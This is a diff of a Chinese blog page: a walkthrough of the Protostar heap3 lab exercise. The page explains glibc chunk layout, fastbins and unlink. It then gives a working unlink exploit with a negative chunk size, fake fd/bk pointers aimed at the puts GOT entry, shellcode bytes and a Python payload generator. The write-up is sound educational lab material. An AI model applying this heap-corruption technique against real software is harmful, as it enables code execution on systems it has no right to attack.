@@ -4,11 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="8023">
-    <meta name="description" content="Pwn-protostar靶场8 heap threeheap3程序静态分析#include &amp;lt;stdlib.h&gt;
+    <meta name="keywords" content="Pwn-protostar靶场8 heap three, 8023">
+    <meta name="description" content="
+
+Pwn-protostar靶场8 heap threeheap3程序静态分析#include &amp;lt;stdlib.h&gt;
 #include &amp;lt;unistd.h&gt;
 #include &amp;lt;string.h&gt;
-#include &amp;lt;">
+#include &amp;l">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +22,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>8023</title>
+    <title>Pwn-protostar靶场8 heap three | 8023</title>
     <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
     
 
@@ -306,12 +308,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title"></h1>
+                    <h1 class="description center-align post-title">Pwn-protostar靶场8 heap three</h1>
                 </div>
             </div>
         </div>
@@ -333,12 +335,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/pwn/">
+                                <span class="chip bg-color">pwn</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                学习
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -347,14 +362,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2025-01-03
+                    2024-11-18
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-11-18
+                    2025-01-03
                 </div>
                 
 
@@ -411,7 +426,9 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Pwn-protostar靶场8-heap-three"><a href="#Pwn-protostar靶场8-heap-three" class="headerlink" title="Pwn-protostar靶场8 heap three"></a>Pwn-protostar靶场8 heap three</h1><h2 id="heap3"><a href="#heap3" class="headerlink" title="heap3"></a>heap3</h2><h3 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+                <span id="more"></span>
+
+<h1 id="Pwn-protostar靶场8-heap-three"><a href="#Pwn-protostar靶场8-heap-three" class="headerlink" title="Pwn-protostar靶场8 heap three"></a>Pwn-protostar靶场8 heap three</h1><h2 id="heap3"><a href="#heap3" class="headerlink" title="heap3"></a>heap3</h2><h3 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
@@ -452,7 +469,7 @@
 <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p> malloc 以块（<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=chunk&spm=1001.2101.3001.7020">chunk</a>）为单位分配内存，其结构如下： </p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731906755721.png" alt="1731906755721"></p>
+<p><img src="/img/1731906755721.png"></p>
 <h4 id="chunk-start："><a href="#chunk-start：" class="headerlink" title="chunk start："></a>chunk start：</h4><p>这是内存块的起始地址。在分配内存时，内存管理器会返回指向这个位置之后的一个指针，具体是mem字段。</p>
 <h4 id="prev-size："><a href="#prev-size：" class="headerlink" title="prev_size："></a>prev_size：</h4><p>前一个块（previous chunk）的大小。前一个块是空闲的时候，这个字段才有意义，因为它会被用于合并空闲块。</p>
 <h4 id="size："><a href="#size：" class="headerlink" title="size："></a>size：</h4><p>当前块的大小，包括所有的元数据和数据区。这个大小通常包括一些标志位，比如当前块是否被分配或者前一个块是否为空闲。</p>
@@ -574,7 +591,7 @@ Mapped address spaces:
         0xb7fff000 0xb8000000     0x1000    0x1b000         &#x2F;lib&#x2F;ld-2.11.2.so
         0xbffeb000 0xc0000000    0x15000          0           [stack]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731907633413.png" alt="1731907633413"></p>
+<p><img src="/img/1731907633413.png"></p>
 <p> 堆的地址为0x804c000-0x804d000，查看堆 </p>
 <pre class="line-numbers language-none"><code class="language-none">(gdb) x&#x2F;40wx 0x804c000
 0x804c000:      0x00000000      0x00000029      0x00000000      0x00000000
@@ -588,10 +605,10 @@ Mapped address spaces:
 0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731907742476.png" alt="1731907742476"></p>
+<p><img src="/img/1731907742476.png"></p>
 <p>堆的突出显示部分是第一个分配的块。我们可以看到prev_size为0，size为0x28+1（40字节，最低有效位+1表示块正在使用），然后是分配内存的32字节。</p>
 <p>现在执行了第一次内存分配</p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731907773015.png" alt="1731907773015"></p>
+<p><img src="/img/1731907773015.png"></p>
 <p>然后用define hook-stop参数在每一步操作停下来后，自动的运行我们设置的命令，可以更方便的展示堆空间的操作 </p>
 <pre class="line-numbers language-none"><code class="language-none">(gdb) define hook-stop
 Type commands for definition of &quot;hook-stop&quot;.
@@ -635,7 +652,7 @@ Breakpoint 3, 0x080488be in main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x
 18      in heap3&#x2F;heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p> 现在已经完成了a,b,c的内存分配，继续下一步操作，strcpy会将我们输入的字符串放入堆中 </p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731907963698.png" alt="1731907963698"></p>
+<p><img src="/img/1731907963698.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">(gdb) c
 Continuing.
 0x80488da &lt;main+81&gt;:    mov    0xc(%ebp),%eax
@@ -686,7 +703,7 @@ Breakpoint 6, main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:24
 24      in heap3&#x2F;heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p> 输入的字符串已经到了指定的位置，现在就来执行最关键的free操作了，执行完这三个free操作后查看堆</p>
-<p> <img src="F:\Desktop\工具\二进制和逆向\img\1731908030205.png" alt="1731908030205"></p>
+<p> <img src="/img/1731908030205.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">(gdb) c
 Continuing.
 0x8048916 &lt;main+141&gt;:   mov    0x18(%esp),%eax
@@ -736,7 +753,7 @@ Continuing.
 Breakpoint 9, main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:28
 28      in heap3&#x2F;heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731908138374.png" alt="1731908138374"></p>
+<p><img src="/img/1731908138374.png"></p>
 <p>现在我们看到了一些意想不到的东西。首先，所有data块中的 prev_size 仍然为 0，但它应该包含前一个data块的大小。其次，虽然 fd 正确指向了下一个空闲块（第一个数据块的地址是 0x0804c028，也就是第二个数据块的地址），但 bk 也没有被设置，还显示的是我们输入的字符串。此外，size字段的最小有效位也没有被设置，这到底是怎么回事？</p>
 <h4 id="Fastbins"><a href="#Fastbins" class="headerlink" title="Fastbins"></a><strong>Fastbins</strong></h4><p>在堆内存管理中，尤其是在GNU C库（glibc）的ptmalloc分配器中，Fastbins 是一种特殊类型的free列表（free list），用于优化小块内存的分配和回收。Fastbins 是针对大小固定且经常被分配和释放的小对象设计的，旨在减少对小对象频繁操作时的性能开销</p>
 <p>之所以没有按照我们预期的方式运行，是因为分配的缓冲区很小。当<strong>块小于 64 字节时</strong>（默认情况下），malloc 将使用简化的数据结构（fastbin），并<strong>忽略 prev_size、bk 和size位</strong>。</p>
@@ -754,7 +771,7 @@ Breakpoint 9, main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:28
 
 <p>调用时，第一个参数 P 是要unlink的数据块，参数 BK 和 FD 是用于存储上一个和下一个空闲数据块指针的临时变量。当一个数据块被解除链接时，下一个空闲数据块 P-&gt;fd 和上一个空闲数据块 P-&gt;bk 会相互指向。 </p>
 <p> 如下图： </p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\044fb4315b9f50d52fcc5a173fda9078.png"></p>
+<p><img src="/img/044fb4315b9f50d52fcc5a173fda9078.png"></p>
 <p><strong>P (free chunk)：</strong><br>这是当前被“unlink”（即解除链接）的空闲内存块。它在双向空闲链表中，并且包含了fd（forward pointer，指向下一个块）和bk（backward pointer，指向前一个块）。</p>
 <p><strong>BK (previous free chunk)：</strong><br>这是P之前的空闲内存块，它的fd指针指向P。</p>
 <p><strong>FD (next free chunk)：</strong><br>这是P之后的空闲内存块，它的bk指针指向P。</p>
@@ -766,12 +783,12 @@ Breakpoint 9, main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:28
 <p>这里还需要用到全局偏移表，具体见前面文章</p>
 <p>plt表的作用是当程序需要调用一个外部函数时，它首先跳转到PLT表中寻找该函数对应的入口，PLT入口包含跳转指令，然后跳转到GOT表中的相应地址，GOT中的地址会指向解析函数，之后解析函数将实际的函数地址写入GOT表，以便后续直接跳转调用 函数</p>
 <p>如果我们覆盖了这个程序的printf got表，可以让程序执行printf函数时跳转到winner函数地址</p>
-<p>这里puts函数的plt表地址是0x8048790，我们可以查看这个地址，找到put函数的got表地址<br><img src="F:\Desktop\工具\二进制和逆向\img\1731908803894.png" alt="1731908803894"></p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731908833316.png" alt="1731908833316"></p>
+<p>这里puts函数的plt表地址是0x8048790，我们可以查看这个地址，找到put函数的got表地址<br><img src="/img/1731908803894.png"></p>
+<p><img src="/img/1731908833316.png"></p>
 <p>gdb将printf函数解析成了put函数，没什么问题，put函数的got表地址为<strong>0x804b128</strong></p>
 <p>现在的计划现在很清楚了。我们将在堆上的某个地方存储调用 winner() 的 shellcode，然后在一个特制的块上强制合并块并调用unlink。该块的 fd 字段包含 0x0804b11c = (0x0804b128-12)，bk 字段包含 shellcode 的地址。我们不能将 winner() 的地址写入 bk，因为这部分内存是不可写的，而且 BK-&gt;fd 也将作为 unlink 的一部分被更新。</p>
 <h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="负数size的块"><a href="#负数size的块" class="headerlink" title="负数size的块"></a>负数size的块</h4><p>我们可以用 -4 (0xfffffffc) 作为块大小</p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731908909257.png" alt="1731908909257"></p>
+<p><img src="/img/1731908909257.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">当使用 fastbin 时，malloc 会将块大小转换为无符号 int，因此 -4 比 64 大。
 0xfffffffc 的最小有效位未设置，这表明前一个相邻的数据块是空闲的，程序会调用unlink
 前一个相邻块的地址将通过从当前块的开头减去-4（即加4）来计算。
@@ -790,7 +807,7 @@ ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
 <p> 使用这个网站将汇编指令调用winner函数的指令转化 ：</p>
 <pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;shell-storm.org&#x2F;online&#x2F;Online-Assembler-and-Disassembler&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731909150376.png" alt="1731909150376"></p>
+<p><img src="/img/1731909150376.png"></p>
 <p> call winner： </p>
 <pre class="line-numbers language-none"><code class="language-none">\x68\x64\x88\x04\x08\xc3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -818,15 +835,15 @@ buffers <span class="token operator">=</span> <span class="token punctuation">[<
         <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>f_name<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                 f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731909382992.png" alt="1731909382992"></p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731909445917.png" alt="1731909445917"></p>
+<p><img src="/img/1731909382992.png"></p>
+<p><img src="/img/1731909445917.png"></p>
 <p> 成功破解程序，现在我们用gdb来看看堆里是什么样子的 </p>
 <pre class="line-numbers language-none"><code class="language-none">(gdb) r $(cat &#x2F;tmp&#x2F;A) $(cat &#x2F;tmp&#x2F;B) $(cat &#x2F;tmp&#x2F;C)
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>已分配完内存，然后就是导入文件里的内容</p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731911090380.png" alt="1731911090380"></p>
+<p><img src="/img/1731911090380.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">(gdb) c
 Continuing.
 0x80488be &lt;main+53&gt;:    mov    %eax,0x1c(%esp)
@@ -844,7 +861,7 @@ Continuing.
 Breakpoint 3, 0x080488be in main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:18
 18      in heap3&#x2F;heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731911112774.png" alt="1731911112774"></p>
+<p><img src="/img/1731911112774.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">(gdb) c
 Continuing.
 0x80488da &lt;main+81&gt;:    mov    0xc(%ebp),%eax
@@ -895,7 +912,7 @@ Breakpoint 6, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:24
 24      in heap3&#x2F;heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p> 执行free与unlink </p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731911188062.png" alt="1731911188062"></p>
+<p><img src="/img/1731911188062.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">(gdb) c
 Continuing.
 0x8048916 &lt;main+141&gt;:   mov    0x18(%esp),%eax
@@ -949,7 +966,7 @@ Breakpoint 9, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:28
 0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x0804c040<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p> puts函数的got表地址成功被覆盖成了winner函数的地址 </p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731911306453.png" alt="1731911306453"></p>
+<p><img src="/img/1731911306453.png"></p>
 <p> 这里推荐<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=HWhzH--89UQ&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=31">LiveOverflow</a>博主的视频教程 </p>
 
                 
@@ -977,7 +994,7 @@ Breakpoint 9, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:28
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Pr0b1em.github.io/2025/01/03/Pwn-protostar%E9%9D%B6%E5%9C%BA8%20heap%20three/">https://Pr0b1em.github.io/2025/01/03/Pwn-protostar%E9%9D%B6%E5%9C%BA8%20heap%20three/</a>
+                    <a href="https://Pr0b1em.github.io/2024/11/18/Pwn-protostar%E9%9D%B6%E5%9C%BA8%20heap%20three/">https://Pr0b1em.github.io/2024/11/18/Pwn-protostar%E9%9D%B6%E5%9C%BA8%20heap%20three/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1014,7 +1031,11 @@ Breakpoint 9, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:28
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/pwn/">
+                                    <span class="chip bg-color">pwn</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -1096,13 +1117,13 @@ Breakpoint 9, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:28
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/2025/01/03/Pwn-protostar%E9%9D%B6%E5%9C%BA8%20heap%20three/">
+                <a href="/2024/11/18/Pwn-protostar%E9%9D%B6%E5%9C%BA8%20heap%20three/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="Pwn-protostar靶场8 heap three">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">Pwn-protostar靶场8 heap three</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1113,17 +1134,29 @@ Breakpoint 9, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:28
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-03
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-11-18
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            Pr0b1em
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                    学习
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -1134,13 +1167,13 @@ Breakpoint 9, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:28
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2025/01/03/Pwn-protostar%E9%9D%B6%E5%9C%BA7%20heap%20two/">
+                <a href="/2024/11/17/Pwn-protostar%E9%9D%B6%E5%9C%BA7%20heap%20two/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="Pwn-protostar靶场7 heap two">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">Pwn-protostar靶场7 heap two</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1151,15 +1184,27 @@ Breakpoint 9, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:28
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-03
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-11-17
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            Pr0b1em
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                    学习
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
                 </div>
                 
             </div>
